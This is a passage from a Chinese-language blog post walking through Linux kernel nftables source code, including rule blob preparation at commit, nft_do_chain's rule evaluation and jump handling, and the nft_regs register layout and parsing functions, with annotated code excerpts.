nft_rule_dp))));<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> &#123;</span><br>u64is_last:<span class="hljs-number">1</span>,<br>dlen:<span class="hljs-number">12</span>,<br>handle:<span class="hljs-number">42</span>;<span class="hljs-comment">/* for tracing */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>data[]<br>__attribute__((aligned(__alignof__(<span class="hljs-keyword">struct</span> nft_expr))));<br>&#125;;<br></code></pre></td></tr></table></figure><p>nft_rule_blob结构体的赋值在 <strong>nf_tables_commit_chain_prepare</strong> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_tables_commit_chain_prepare</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> nft_chain *chain)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs_track</span> <span class="hljs-title">track</span> =</span> &#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, data_size;<br><span class="hljs-type">void</span> *data, *data_boundary;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">prule</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule</span> *<span class="hljs-title">rule</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 1. 判断是否已经赋值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (chain-&gt;blob_next || !nft_is_active_next(net, chain))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 计算所需大小</span><br><span class="hljs-comment">     */</span><br>rule = list_entry(&amp;chain-&gt;rules, <span class="hljs-keyword">struct</span> nft_rule, <span class="hljs-built_in">list</span>);<br><br>data_size = <span class="hljs-number">0</span>;<br>list_for_each_entry_continue(rule, &amp;chain-&gt;rules, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (nft_is_active_next(net, rule)) &#123;<br>data_size += <span class="hljs-keyword">sizeof</span>(*prule) + rule-&gt;dlen;<br><span class="hljs-keyword">if</span> (data_size &gt; INT_MAX)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>&#125;<br>data_size += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<span class="hljs-comment">/* last rule */</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 创建nft_rule_blob</span><br><span class="hljs-comment">     */</span><br>chain-&gt;blob_next = nf_tables_chain_alloc_rules(data_size);<br><span class="hljs-keyword">if</span> (!chain-&gt;blob_next)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>data = (<span class="hljs-type">void</span> *)chain-&gt;blob_next-&gt;data;<br>data_boundary = data + data_size;<br>size = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. 将所有expr的内容复制到nft_rule_blob中</span><br><span class="hljs-comment">     */</span><br>list_for_each_entry_continue(rule, &amp;chain-&gt;rules, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (!nft_is_active_next(net, rule))<br><span class="hljs-keyword">continue</span>;<br><br>prule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)data;<br>data += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>size = <span class="hljs-number">0</span>;<br>track.last = nft_expr_last(rule);<br>nft_rule_for_each_expr(expr, last, rule) &#123;<br>track.cur = expr;<br><br><span class="hljs-keyword">if</span> (nft_expr_reduce(&amp;track, expr)) &#123;<br>expr = track.cur;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data + expr-&gt;ops-&gt;size &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br><span class="hljs-built_in">memcpy</span>(data + size, expr, expr-&gt;ops-&gt;size);<br>size += expr-&gt;ops-&gt;size;<br>&#125;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt;= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>prule-&gt;handle = rule-&gt;handle;<br>prule-&gt;dlen = size;<br>prule-&gt;is_last = <span class="hljs-number">0</span>;<br><br>data += size;<br>size = <span class="hljs-number">0</span>;<br>chain-&gt;blob_next-&gt;size += (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(data - (<span class="hljs-type">void</span> *)prule);<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. 标记islast</span><br><span class="hljs-comment">     */</span><br>prule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)data;<br>data += offsetof(<span class="hljs-keyword">struct</span> nft_rule_dp, data);<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(data &gt; data_boundary))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>nft_last_rule(chain-&gt;blob_next, prule);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>nf_tables_commit_chain_prepare在nf_tables_commit中被调用</p></li><li><p>nf_tables_commit是nf_tables_subsys的commit成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnetlink_subsystem</span> <span class="hljs-title">nf_tables_subsys</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;nf_tables&quot;</span>,<br>.subsys_id= NFNL_SUBSYS_NFTABLES,<br>.cb_count= NFT_MSG_MAX,<br>.cb= nf_tables_cb,<br>.commit= nf_tables_commit,<br>.<span class="hljs-built_in">abort</span>= nf_tables_abort,<br>.cleanup= nf_tables_cleanup,<br>.valid_genid= nf_tables_valid_genid,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>nfnetlink_rcv_batch中调用了commit，表示提交更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (status == NFNL_BATCH_DONE) &#123;<br>err = ss-&gt;commit(net, oskb);<br><span class="hljs-keyword">if</span> (err == -EAGAIN) &#123;<br>status |= NFNL_BATCH_REPLAY;<br><span class="hljs-keyword">goto</span> done;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err) &#123;<br>ss-&gt;<span class="hljs-built_in">abort</span>(net, oskb, NFNL_ABORT_NONE);<br>netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="hljs-literal">NULL</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-do-chain"><a href="#nft-do-chain" class="headerlink" title="nft_do_chain"></a>nft_do_chain</h4><p>之前提到的注册的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">.hooks= &#123;<br>[NF_INET_LOCAL_IN]= nft_do_chain_ipv4,<br>[NF_INET_LOCAL_OUT]= nft_do_chain_ipv4,<br>[NF_INET_FORWARD]= nft_do_chain_ipv4,<br>[NF_INET_PRE_ROUTING]= nft_do_chain_ipv4,<br>[NF_INET_POST_ROUTING]= nft_do_chain_ipv4,<br>&#125;,<br></code></pre></td></tr></table></figure><p>最终都是调用nft_do_chain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_do_chain_ipv4</span><span class="hljs-params">(<span class="hljs-type">void</span> *priv,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_state *state)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pktinfo</span> <span class="hljs-title">pkt</span>;</span><br><br>nft_set_pktinfo(&amp;pkt, skb, state);<br>nft_set_pktinfo_ipv4(&amp;pkt);<br><br><span class="hljs-keyword">return</span> nft_do_chain(&amp;pkt, priv);<br>&#125;<br></code></pre></td></tr></table></figure><p>regs和jumpstack相关数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_jumpstack</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">last_rule</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_registers</span> &#123;</span><br>NFT_REG_VERDICT,<br>NFT_REG_1,<br>NFT_REG_2,<br>NFT_REG_3,<br>NFT_REG_4,<br>__NFT_REG_MAX,<br><br>NFT_REG32_00= <span class="hljs-number">8</span>,<br>NFT_REG32_01,<br>NFT_REG32_02,<br>NFT_REG32_03,<br>NFT_REG32_04,<br>NFT_REG32_05,<br>NFT_REG32_06,<br>NFT_REG32_07,<br>NFT_REG32_08,<br>NFT_REG32_09,<br>NFT_REG32_10,<br>NFT_REG32_11,<br>NFT_REG32_12,<br>NFT_REG32_13,<br>NFT_REG32_14,<br>NFT_REG32_15,<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG_MAX(__NFT_REG_MAX - 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG_SIZE16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG32_SIZE4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFT_REG32_COUNT(NFT_REG32_15 - NFT_REG32_00 + 1)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nft_do_chain</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nft_pktinfo *pkt, <span class="hljs-type">void</span> *priv)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv, *basechain = chain;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_dp</span> *<span class="hljs-title">rule</span>, *<span class="hljs-title">last_rule</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> nft_net(pkt);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr</span> *<span class="hljs-title">expr</span>, *<span class="hljs-title">last</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> <span class="hljs-title">regs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stackptr = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_jumpstack</span> <span class="hljs-title">jumpstack</span>[<span class="hljs-title">NFT_JUMP_STACK_SIZE</span>];</span><br><span class="hljs-type">bool</span> genbit = READ_ONCE(net-&gt;nft.gencursor);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_rule_blob</span> *<span class="hljs-title">blob</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_traceinfo</span> <span class="hljs-title">info</span>;</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 获取rule</span><br><span class="hljs-comment">     */</span><br>info.trace = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;nft_trace_enabled))<br>nft_trace_init(&amp;info, pkt, &amp;regs.verdict, basechain);<br>do_chain:<br><span class="hljs-keyword">if</span> (genbit)<br>blob = rcu_dereference(chain-&gt;blob_gen_1);<br><span class="hljs-keyword">else</span><br>blob = rcu_dereference(chain-&gt;blob_gen_0);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 遍历rule中的所有expr并执行</span><br><span class="hljs-comment">     */</span><br>rule = (<span class="hljs-keyword">struct</span> nft_rule_dp *)blob-&gt;data;<br>last_rule = (<span class="hljs-type">void</span> *)blob-&gt;data + blob-&gt;size;<br>next_rule:<br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">for</span> (; rule &lt; last_rule; rule = nft_rule_next(rule)) &#123;<br>nft_rule_dp_for_each_expr(expr, last, rule) &#123;<br><span class="hljs-keyword">if</span> (expr-&gt;ops == &amp;nft_cmp_fast_ops)<br>nft_cmp_fast_eval(expr, &amp;regs);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expr-&gt;ops == &amp;nft_bitwise_fast_ops)<br>nft_bitwise_fast_eval(expr, &amp;regs);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (expr-&gt;ops != &amp;nft_payload_fast_ops ||<br> !nft_payload_fast_eval(expr, &amp;regs, pkt))<br>expr_call_ops_eval(expr, &amp;regs, pkt);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * 3. 如果没有设置verdict则继续执行</span><br><span class="hljs-comment">             */</span><br><span class="hljs-keyword">if</span> (regs.verdict.code != NFT_CONTINUE)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 4. 一条rule执行完成或者中途发生跳转，进行判决</span><br><span class="hljs-comment">         */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_BREAK:<span class="hljs-comment">// rule中途设置了break，继续执行下一条rule</span><br>regs.verdict.code = NFT_CONTINUE;<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<span class="hljs-comment">// 一条rule执行完，继续执行下一条rule</span><br>nft_trace_packet(&amp;info, chain, rule,<br> NFT_TRACETYPE_RULE);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">// 否则执行完成，进行判决</span><br>&#125;<br><br>nft_trace_verdict(&amp;info, chain, rule, &amp;regs);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. 没有跳转，返回链最终判决结果</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">case</span> NF_DROP:<br><span class="hljs-keyword">case</span> NF_QUEUE:<br><span class="hljs-keyword">case</span> NF_STOLEN:<br><span class="hljs-keyword">return</span> regs.verdict.code;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 6. 存在跳转，处理跳转</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (regs.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_JUMP:<span class="hljs-comment">// jump：入栈返回地址</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(stackptr &gt;= NFT_JUMP_STACK_SIZE))<br><span class="hljs-keyword">return</span> NF_DROP;<br>jumpstack[stackptr].chain = chain;<br>jumpstack[stackptr].rule = nft_rule_next(rule);<br>jumpstack[stackptr].last_rule = last_rule;<br>stackptr++;<br>fallthrough;<br><span class="hljs-keyword">case</span> NFT_GOTO:<span class="hljs-comment">// goto：直接跳转</span><br>chain = regs.verdict.chain;<br><span class="hljs-keyword">goto</span> do_chain;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<span class="hljs-comment">// 其他特殊处理</span><br><span class="hljs-keyword">case</span> NFT_RETURN:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (stackptr &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// return：出栈返回地址</span><br>stackptr--;<br>chain = jumpstack[stackptr].chain;<br>rule = jumpstack[stackptr].rule;<br>last_rule = jumpstack[stackptr].last_rule;<br><span class="hljs-keyword">goto</span> next_rule;<br>&#125;<br><br>nft_trace_packet(&amp;info, basechain, <span class="hljs-literal">NULL</span>, NFT_TRACETYPE_POLICY);<br><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;nft_counters_enabled))<br>nft_update_chain_stats(basechain, pkt);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 7. 如果没有到达明确的verdict，返回chain的policy（默认为accept或drop） </span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">return</span> nft_base_chain(basechain)-&gt;policy;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_do_chain);<br></code></pre></td></tr></table></figure><h3 id="nftables-expression"><a href="#nftables-expression" class="headerlink" title="nftables expression"></a>nftables expression</h3><h4 id="通用函数"><a href="#通用函数" class="headerlink" title="通用函数"></a>通用函数</h4><p>每个expression都会有一个init函数和一个eval函数</p><ul><li>init函数负责初始化对应expr结构体</li><li>eval函数负责执行对应的动作，比如向某个寄存器写入数据</li></ul><h5 id="nft-regs内存布局"><a href="#nft-regs内存布局" class="headerlink" title="nft_regs内存布局"></a>nft_regs内存布局</h5><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/regs.png" class title="regs"><ul><li>nftables最开始使用 <strong>16bytes verdict</strong> + <strong>4</strong> x <strong>16bytes data reg</strong></li><li>后来使用 <strong>16bytes verdict</strong> + <strong>16</strong> x <strong>4bytes data reg</strong></li></ul><p>使用 <strong>nft_parse_register</strong> 获取寄存器下标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reg;<br><br>reg = ntohl(nla_get_be32(attr));<br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:<br><span class="hljs-keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>NFT_REG</strong> 使用16bytes data reg</p><ul><li><p>枚举从0开始</p></li><li><p>4个u32表示一个reg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><p>所以乘四就行</p></li><li><p><strong>NFT_REG32</strong> 使用4bytes data reg</p><ul><li>枚举从8开始</li><li>一个u32表示一个reg</li><li>第一个verdict占16bytes，4个u32</li></ul><p>所以减枚举基数再加verdict占的空间</p></li></ul><h5 id="nft-parse-register-xxx"><a href="#nft-parse-register-xxx" class="headerlink" title="nft_parse_register_xxx"></a>nft_parse_register_xxx</h5><ul><li><p><strong>nft_parse_register_load</strong>：解析源寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_load</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *sreg, u32 len)</span><br>&#123;<br>u32 reg;<br><span class="hljs-type">int</span> err;<br><br>reg = nft_parse_register(attr);<br>err = nft_validate_register_load(reg, len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*sreg = reg;<br><span class="hljs-keyword">return</span> <span 